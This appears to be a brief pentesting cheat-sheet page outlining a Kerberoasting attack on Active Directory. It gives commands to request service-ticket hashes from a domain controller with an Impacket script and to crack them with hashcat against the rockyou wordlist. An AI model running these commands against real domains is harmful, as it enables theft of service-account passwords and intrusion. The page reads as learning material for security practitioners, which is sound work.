# Kerberoasting Overview

## Resources

* [https://medium.com/@Shorty420/kerberoasting-9108477279cc](https://medium.com/@Shorty420/kerberoasting-9108477279cc)

![](../../.gitbook/assets/untitled%20%281%29.png)

## Kerberoasting Attack Overview

### Step 1: Get SPNs \(Service Principal Name\), Dump Hash

```bash
python getuserspns.py <DOMAIN/username:password> -dc-ip <ip of DC> -request
```

### Step 2: Crack the Hash

```bash
hashcat --help | grep Kerberos
hashcat -m 13100 kerberoasthash.txt rockyou.txt
```

